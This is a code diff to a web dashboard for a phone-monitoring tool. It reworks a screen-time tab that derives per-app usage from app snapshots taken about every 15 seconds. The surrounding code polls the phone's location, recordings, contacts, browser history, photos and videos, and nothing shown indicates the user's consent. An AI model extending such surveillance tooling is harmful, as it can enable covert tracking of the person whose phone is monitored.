@@ -114,6 +114,22 @@ button#loadHistoryBtn{padding:5px 7px;font-size:15px;min-height:30px;min-width:3
 .bar-fill{height:18px;background:var(--accent);border-radius:3px;min-width:2px}
 .bar-label{width:100px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;flex-shrink:0}
 .bar-val{color:var(--muted);font-size:13px;width:50px;text-align:right}
+.apps-headline{display:flex;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap;background:var(--card);border:1px solid var(--border);border-left:3px solid var(--accent);border-radius:var(--radius);padding:12px 14px;margin-bottom:10px}
+.apps-headline .ah-num{font-size:30px;font-weight:700;color:var(--accent);line-height:1}
+.apps-headline .ah-sub{font-size:12px;color:var(--muted);margin-top:3px}
+.apps-headline .ah-stats{display:flex;gap:18px;flex-wrap:wrap;font-size:12px;color:var(--muted)}
+.apps-headline .ah-stats b{display:block;font-size:16px;font-weight:600;color:var(--text)}
+.app-row{display:flex;align-items:center;gap:10px;padding:6px 8px;border-bottom:1px solid var(--border);font-size:13px}
+.app-row:last-child{border-bottom:none}
+.app-row .ar-name{width:118px;flex-shrink:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-weight:500}
+.app-row .ar-track{flex:1;height:16px;background:var(--border);border-radius:4px;overflow:hidden;position:relative}
+.app-row .ar-track > div{height:100%;background:linear-gradient(90deg,var(--accent),#ff8c42);border-radius:4px;min-width:2px}
+.app-row .ar-meta{flex-shrink:0;text-align:right;min-width:130px}
+.app-row .ar-meta .ar-time{font-weight:600;color:var(--text);white-space:nowrap}
+.app-row .ar-meta .ar-sub{font-size:11px;color:var(--muted);white-space:nowrap}
+.apps-loading{display:flex;align-items:center;gap:8px;font-size:13px;color:var(--muted);padding:8px 0}
+.apps-loading .spinner{width:14px;height:14px;border:2px solid var(--border);border-top-color:var(--accent);border-radius:50%;animation:appsSpin .8s linear infinite;flex-shrink:0}
+@keyframes appsSpin{to{transform:rotate(360deg)}}
 table{width:100%;border-collapse:collapse;font-size:14px}
 th{text-align:left;padding:6px 4px;color:var(--muted);border-bottom:1px solid var(--border)}
 td{padding:6px 4px;border-bottom:1px solid var(--border)}
@@ -442,11 +458,13 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 <div id="tab-apps"><div class="app-period" style="display:flex;gap:6px;margin-bottom:8px;flex-wrap:wrap">
 <span class="app-period-btn active" data-period="today">Today</span>
 <span class="app-period-btn" data-period="yesterday">Yesterday</span>
-<span class="app-period-btn" data-period="week">7-day avg</span>
+<span class="app-period-btn" data-period="week">7 days</span>
   </div><div style="font-size:12px;color:var(--muted);margin-bottom:6px" id="appsSyncInfo"></div>
-  <div id="appsTotalLine" style="font-size:13px;font-weight:500;margin:4px 0 2px"></div>
-  <div id="appsChart"></div>
+  <div id="appsHeadline"></div>
+  <div id="appsChart"><div class="label">No app usage data yet</div></div>
   <div id="appsHourlyChart"></div>
+  <div id="appsLegacyDebug" style="display:none"></div>
+  <div id="appsSnapDebug" style="display:none"></div>
 </div>
 <div id="tab-geofence">
 <div class="card" style="border-left-color:var(--accent);padding:12px;margin-bottom:10px">
@@ -1819,6 +1837,7 @@ document.querySelectorAll('.tab-btn').forEach(btn => {
       if (!callsCache) pollHistory();
       renderCalls(timelineCache);
     }
+    if (btn.dataset.tab === 'apps') refreshAppsTab(true);
   });
 });
 
@@ -2499,6 +2518,7 @@ document.getElementById('deviceSelect').addEventListener('change', function() {
   appsPhoneSync = 0;
   appSnapshotsCache = null;
   appSnapshotsLastSync = 0;
+  appsUsageReset();
   resetRecentsPagination();
   contactsCache = null;
   contactsSyncTs = 0;
@@ -2536,7 +2556,7 @@ function startPolling() {
   stopPolling();
   pollLocation();
   schedulePoll('meta', intervals.meta, pollMeta);
-  schedulePoll('apps', intervals.apps, pollApps);
+  schedulePoll('apps', intervals.apps, () => refreshAppsTab(false));
   schedulePoll('appSnapshots', 30000, pollAppSnapshots);
   schedulePoll('hist', intervals.hist, pollHistory);
   schedulePoll('voice', intervals.voice, pollVoiceNotes);
@@ -2563,7 +2583,7 @@ function schedulePoll(name, interval, fn) {
 }
 
 async function pollAll() {
-  const fns = [pollLocation(), pollMeta(), pollApps(), pollAppSnapshots(), pollHistory(), pollVoiceNotes(), pollRemoteRecordings(), pollContacts(), pollFcmToken(), pollQueueSize(), pollBrowserHistory(), pollPermissions(), pollWifiScans(), pollLogcat(), pollHealth(), pollVideos(), pollPhotos()];
+  const fns = [pollLocation(), pollMeta(), pollAppSnapshots(), pollHistory(), pollVoiceNotes(), pollRemoteRecordings(), pollContacts(), pollFcmToken(), pollQueueSize(), pollBrowserHistory(), pollPermissions(), pollWifiScans(), pollLogcat(), pollHealth(), pollVideos(), pollPhotos()];
   for (const fn of fns) { try { await fn; } catch {} }
 }
 
@@ -3301,11 +3321,226 @@ function appsTotalStr(ms) {
   const h = Math.floor(min / 60), m = min % 60;
   return (h > 0 ? h + 'h ' : '') + m + 'm';
 }
-function renderApps(sorted) {
-  const chart = document.getElementById('appsChart');
+// === Apps tab: screen time derived from the appSnapshots stream (accurate) ===
+let appsUsageCache = null;
+let appsUsageDevice = null;
+let appsUsageWindowStart = 0;
+let appsUsageLoadedAll = false;
+let appsUsageBusy = false;
+let appsUsageFetchedAt = 0;
+
+function appsUsageReset() {
+  appsUsageCache = null; appsUsageDevice = null; appsUsageWindowStart = 0;
+  appsUsageLoadedAll = false; appsUsageBusy = false; appsUsageFetchedAt = 0;
+}
+function appsWindowStartFor(period) {
+  const now = Date.now();
+  const todayStart = startOfTodayPKT();
+  if (period === 'yesterday') return todayStart - 86400000;
+  if (period === 'week') return now - 7 * 86400000;
+  return todayStart;
+}
+function appsMaxPagesFor(period) {
+  return period === 'week' ? 100 : (period === 'yesterday' ? 40 : 40);
+}
+function pktHourOf(ts) {
+  try {
+    const parts = new Intl.DateTimeFormat('en-US', { timeZone: PKT, hour: '2-digit', hourCycle: 'h23' }).formatToParts(new Date(ts));
+    const h = (parts.find(p => p.type === 'hour') || {}).value;
+    return h != null ? parseInt(h, 10) % 24 : new Date(ts).getHours();
+  } catch { return new Date(ts).getHours(); }
+}
+function appsSnapNorm(key, val) {
+  const ts = parseInt(val.dashboardTsMs || key || '0', 10);
+  if (!(ts > 0)) return null;
+  return { key: String(key), ts, appName: val.appName || val.packageName || '?', packageName: val.packageName || '' };
+}
+async function fetchAppsSnapshotsSince(startMs, maxPages, onProgress) {
+  if (!selectedDevice) return false;
+  if (appsUsageDevice !== selectedDevice) {
+    appsUsageCache = null; appsUsageDevice = selectedDevice; appsUsageLoadedAll = false; appsUsageWindowStart = 0;
+  }
+  const byKey = new Map();
+  if (appsUsageCache) for (const s of appsUsageCache) byKey.set(s.key, s);
+  let oldestKey = null;
+  let reachedStart = false;
+  let page = 0;
+  // Always refresh the newest page first so the most recent rows are included.
+  let data = await fetchRTDB(`devices/${selectedDevice}/appSnapshots`, `orderBy=%22%24key%22&limitToLast=${RECENTS_PAGE + 1}`);
+  if (data && typeof data === 'object') {
+    const keys = Object.keys(data).sort((a, b) => (parseInt(b, 10) || 0) - (parseInt(a, 10) || 0));
+    for (const key of keys) {
+      const s = appsSnapNorm(key, data[key]);
+      if (s && !byKey.has(s.key)) byKey.set(s.key, s);
+    }
+    oldestKey = keys.length ? keys[keys.length - 1] : null;
+    page++;
+    if (onProgress) onProgress(byKey.size, page);
+  }
+  while (oldestKey && page < maxPages && !reachedStart) {
+    const enc = encodeURIComponent(JSON.stringify(oldestKey));
+    const q = `orderBy=%22%24key%22&endAt=${enc}&limitToLast=${RECENTS_PAGE + 1}`;
+    data = await fetchRTDB(`devices/${selectedDevice}/appSnapshots`, q);
+    if (!data || typeof data !== 'object') { reachedStart = true; break; }
+    const keys = Object.keys(data).sort((a, b) => (parseInt(b, 10) || 0) - (parseInt(a, 10) || 0));
+    let anyUnder = false;
+    for (const key of keys) {
+      const s = appsSnapNorm(key, data[key]);
+      if (!s || byKey.has(s.key)) continue;
+      byKey.set(s.key, s);
+      if (s.ts < startMs) anyUnder = true;
+    }
+    if (keys.length < RECENTS_PAGE + 1) reachedStart = true;
+    if (anyUnder) reachedStart = true;
+    oldestKey = keys.length ? keys[keys.length - 1] : null;
+    page++;
+    if (onProgress) onProgress(byKey.size, page);
+  }
+  if (oldestKey === null) reachedStart = true;
+  appsUsageCache = Array.from(byKey.values()).sort((a, b) => a.ts - b.ts);
+  appsUsageWindowStart = Math.min(appsUsageWindowStart || Infinity, startMs);
+  appsUsageLoadedAll = reachedStart;
+  appsUsageFetchedAt = Date.now();
+  return reachedStart;
+}
+function computeAppsFromSnapshots(entries, startMs, endMs, maxGapMs) {
+  maxGapMs = maxGapMs || 90000;
+  const sorted = entries.filter(s => s.ts >= startMs && s.ts <= endMs).sort((a, b) => a.ts - b.ts);
+  const appMap = new Map();
+  const hourlyTotal = new Array(24).fill(0);
+  let totalMs = 0;
+  for (let i = 0; i < sorted.length; i++) {
+    const cur = sorted[i];
+    if (i + 1 >= sorted.length) continue;
+    const gap = sorted[i + 1].ts - cur.ts;
+    if (gap <= 0 || gap > maxGapMs) continue;
+    totalMs += gap;
+    hourlyTotal[pktHourOf(cur.ts)] += gap;
+    let a = appMap.get(cur.packageName);
+    if (!a) { a = { name: cur.appName, pkg: cur.packageName, ms: 0, lastTs: 0, hourly: new Array(24).fill(0) }; appMap.set(cur.packageName, a); }
+    a.ms += gap;
+    a.lastTs = Math.max(a.lastTs, cur.ts);
+    a.hourly[pktHourOf(cur.ts)] += gap;
+  }
+  return { apps: Array.from(appMap.values()).sort((a, b) => b.ms - a.ms), totalMs, hourlyTotal };
+}
+function renderAppsTab(entries, period, reachedStart) {
   const syncEl = document.getElementById('appsSyncInfo');
-  const totalEl = document.getElementById('appsTotalLine');
+  const headlineEl = document.getElementById('appsHeadline');
+  const chartEl = document.getElementById('appsChart');
   const hourlyEl = document.getElementById('appsHourlyChart');
+  if (!entries) return;
+  const now = Date.now();
+  const todayStart = startOfTodayPKT();
+  let startMs, endMs, periodLabel, headlineLabel;
+  if (period === 'yesterday') { startMs = todayStart - 86400000; endMs = todayStart; periodLabel = 'yesterday'; headlineLabel = 'Screen time \u00B7 yesterday'; }
+  else if (period === 'week') { startMs = now - 7 * 86400000; endMs = now; periodLabel = 'last 7 days'; headlineLabel = 'Screen time \u00B7 last 7 days'; }
+  else { startMs = todayStart; endMs = now; periodLabel = 'today'; headlineLabel = 'Screen time \u00B7 today'; }
+  const within = entries.filter(s => s.ts >= startMs && s.ts <= endMs);
+  let syncTxt = '';
+  if (within.length) {
+    syncTxt = '\u{1F4F1} snapshots ' + pktShort(within[0].ts) + ' \u2013 ' + pktShort(within[within.length - 1].ts) + ' \u00B7 ' + within.length.toLocaleString() + ' rows';
+  }
+  if (!reachedStart && !appsUsageLoadedAll) syncTxt += ' \u26A0 partial \u2014 older snapshots not fetched';
+  if (syncEl) syncEl.textContent = syncTxt;
+  const r = computeAppsFromSnapshots(entries, startMs, endMs);
+  if (!r.totalMs) {
+    if (headlineEl) headlineEl.innerHTML = '';
+    if (chartEl) chartEl.innerHTML = '<div class="label">No app usage data for ' + periodLabel + (within.length ? '' : ' \u2014 no snapshots in this window') + '</div>';
+    if (hourlyEl) hourlyEl.innerHTML = '';
+    return;
+  }
+  if (headlineEl) {
+    const elapsed = Math.max(1, endMs - startMs);
+    const onPct = (100 * r.totalMs / elapsed).toFixed(1);
+    headlineEl.innerHTML = '<div class="apps-headline">' +
+      '<div><div class="ah-num">' + appsTotalStr(r.totalMs) + '</div><div class="ah-sub">' + headlineLabel + '</div></div>' +
+      '<div class="ah-stats">' +
+        '<div><b>' + r.apps.length + '</b>apps used</div>' +
+        '<div><b>' + onPct + '%</b>screen-on</div>' +
+      '</div></div>';
+  }
+  if (chartEl) {
+    const maxMs = r.apps[0].ms || 1;
+    chartEl.innerHTML = r.apps.map(a => {
+      const pct = Math.max(2, Math.round(100 * a.ms / maxMs));
+      const share = (100 * a.ms / r.totalMs).toFixed(0) + '%';
+      return '<div class="app-row">' +
+        '<span class="ar-name" title="' + escHtml(a.pkg || '') + '">' + escHtml(a.name) + '</span>' +
+        '<div class="ar-track"><div style="width:' + pct + '%"></div></div>' +
+        '<div class="ar-meta"><div class="ar-time">' + appsTotalStr(a.ms) + ' \u00B7 ' + share + '</div>' +
+        '<div class="ar-sub">last used ' + relativeTime(a.lastTs) + '</div></div>' +
+      '</div>';
+    }).join('');
+  }
+  if (hourlyEl) {
+    if (period === 'today') {
+      const curHour = pktHourOf(now);
+      const maxH = Math.max.apply(null, r.hourlyTotal.concat([1]));
+      const bars = r.hourlyTotal.map((v, h) => {
+        if (h > curHour) return '';
+        const pct = Math.max(2, (v / maxH) * 90);
+        const isCur = h === curHour;
+        return `<div title="${APP_HOUR_LABELS[h]} \u2014 ${(v/60000).toFixed(1)}m" style="flex:1;max-width:26px;display:flex;flex-direction:column;align-items:center;justify-content:flex-end;min-width:8px">
+          <div style="width:100%;height:${pct.toFixed(0)}%;background:var(--accent);opacity:${isCur ? 1 : (v > 0 ? Math.max(0.35, v / maxH) : 0.12)};border-radius:2px 2px 0 0;${isCur ? 'outline:1px solid var(--accent);outline-offset:1px' : ''}"></div>
+          <div style="font-size:8px;text-align:center;color:var(--muted);margin-top:2px;transform:rotate(-45deg);transform-origin:top center">${APP_HOUR_LABELS[h]}</div>
+        </div>`;
+      }).join('');
+      hourlyEl.innerHTML = '<div style="font-size:12px;color:var(--muted);margin:12px 0 4px">\u{1F4C5} Today by hour <span style="color:var(--accent)">(current hour highlighted)</span></div>' +
+        '<div style="display:flex;align-items:stretch;gap:2px;height:80px;padding:4px 2px;overflow-x:auto">' + bars + '</div>';
+    } else {
+      hourlyEl.innerHTML = '';
+    }
+  }
+}
+async function refreshAppsTab(force) {
+  if (!selectedDevice || appsUsageBusy) return;
+  const period = document.querySelector('.app-period-btn.active')?.dataset?.period || 'today';
+  const startMs = appsWindowStartFor(period);
+  const maxPages = appsMaxPagesFor(period);
+  const fresh = appsUsageFetchedAt && (Date.now() - appsUsageFetchedAt < 60000);
+  const hasWindow = appsUsageCache && appsUsageDevice === selectedDevice && appsUsageWindowStart <= startMs;
+  if (!force && hasWindow) {
+    if (fresh) { renderAppsTab(appsUsageCache, period, appsUsageLoadedAll); return; }
+    // Stale cache: cheap refresh of just the newest page, then re-render.
+    appsUsageBusy = true;
+    try {
+      const data = await fetchRTDB(`devices/${selectedDevice}/appSnapshots`, `orderBy=%22%24key%22&limitToLast=${RECENTS_PAGE + 1}`);
+      if (data && typeof data === 'object') {
+        const byKey = new Map(appsUsageCache.map(s => [s.key, s]));
+        for (const [key, val] of Object.entries(data)) {
+          const s = appsSnapNorm(key, val);
+          if (s && !byKey.has(s.key)) byKey.set(s.key, s);
+        }
+        appsUsageCache = Array.from(byKey.values()).sort((a, b) => a.ts - b.ts);
+        appsUsageFetchedAt = Date.now();
+      }
+    } catch {}
+    appsUsageBusy = false;
+    renderAppsTab(appsUsageCache, period, appsUsageLoadedAll);
+    return;
+  }
+  if (!force) return;
+  appsUsageBusy = true;
+  const chartEl = document.getElementById('appsChart');
+  const syncEl = document.getElementById('appsSyncInfo');
+  if (chartEl) chartEl.innerHTML = '<div class="apps-loading"><div class="spinner"></div><span>Fetching app snapshots\u2026</span></div>';
+  if (syncEl) syncEl.textContent = '';
+  try {
+    const reachedStart = await fetchAppsSnapshotsSince(startMs, maxPages, (count, page) => {
+      if (syncEl) syncEl.textContent = '\u{1F4F1} Fetching snapshots\u2026 ' + count.toLocaleString() + ' rows (page ' + page + ')';
+    });
+    if (appsUsageDevice === selectedDevice) renderAppsTab(appsUsageCache, period, reachedStart);
+  } catch {
+    if (appsUsageDevice === selectedDevice && appsUsageCache) renderAppsTab(appsUsageCache, period, appsUsageLoadedAll);
+  }
+  appsUsageBusy = false;
+}
+function renderApps(sorted) {
+  const chart = document.getElementById('appsLegacyDebug');
+  const syncEl = document.getElementById('appsLegacyDebug');
+  const totalEl = document.getElementById('appsLegacyDebug');
+  const hourlyEl = document.getElementById('appsLegacyDebug');
   const period = document.querySelector('.app-period-btn.active')?.dataset?.period || 'today';
   const full = (sorted && sorted.length ? sorted : appsCache) || appsFullCache || [];
   if (!full.length) {
@@ -3375,8 +3610,8 @@ function renderAppsHourly(full) {
 }
 
 function renderAppSnapshots() {
-  const chart = document.getElementById('appsChart');
-  const syncEl = document.getElementById('appsSyncInfo');
+  const chart = document.getElementById('appsSnapDebug');
+  const syncEl = document.getElementById('appsSnapDebug');
   if (!appSnapshotsCache || !appSnapshotsCache.length) {
     chart.innerHTML = '<div class="label">No app snapshots yet. Captured ~every 15s while the phone screen is on.</div>';
     if (syncEl) syncEl.textContent = '';
@@ -5920,11 +6155,7 @@ document.querySelectorAll('.app-period-btn').forEach(btn => {
   btn.addEventListener('click', () => {
     document.querySelectorAll('.app-period-btn').forEach(b => b.classList.remove('active'));
     btn.classList.add('active');
-    if (appsCache) {
-      renderApps(appsCache);
-    } else {
-      pollApps();
-    }
+    refreshAppsTab(true);
   });
 });
 
